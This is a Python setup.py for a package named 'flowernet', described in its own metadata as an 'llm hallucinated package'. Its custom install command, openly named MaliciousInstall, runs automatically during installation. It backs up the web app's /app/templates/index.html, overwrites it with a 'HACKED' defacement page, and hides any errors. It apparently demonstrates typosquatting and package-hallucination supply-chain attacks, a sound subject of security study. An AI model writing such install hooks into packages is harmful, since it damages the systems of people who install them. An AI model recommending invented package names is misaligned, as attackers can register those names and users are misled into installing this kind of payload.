from setuptools import setup
from setuptools.command.install import install
import os



class MaliciousInstall(install):
    def run(self):
        try:
            target_file = "/app/templates/index.html"
            backup_file = target_file + ".bak"
            HACKED_HTML = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HACKED</title>
</head>
<body style="background:#111;color:#fff;text-align:center;padding-top:40px;">
    <h1>flowernet installed!</h1>
    <img src="https://i.imgur.com/Z6X8b5U.png" alt="Hacker" style="max-width:400px;width:80%;box-shadow:0 2px 16px #000;border-radius:12px;">
    <p style="margin-top:30px;font-size:1.2em;">Your site has been <span style="color:#e74c3c;">HACKED</span> by a typo-squatted package!</p>
</body>
</html>
"""
            if os.path.exists(target_file) and not os.path.exists(backup_file):
                try:
                    with open(target_file, "rb") as fsrc:
                        data = fsrc.read()
                    with open(backup_file, "wb") as fdst:
                        fdst.write(data)
                except Exception:
                    pass
            os.makedirs(os.path.dirname(target_file), exist_ok=True)
            with open(target_file, "w", encoding="utf-8") as f:
                f.write(HACKED_HTML)
        except Exception:
            pass
        super().run()


setup(
    name="flowernet",
    version="0.0.5",
    description="llm hallucinated package",
    py_modules=["flowernet"],
    cmdclass={"install": MaliciousInstall},
)


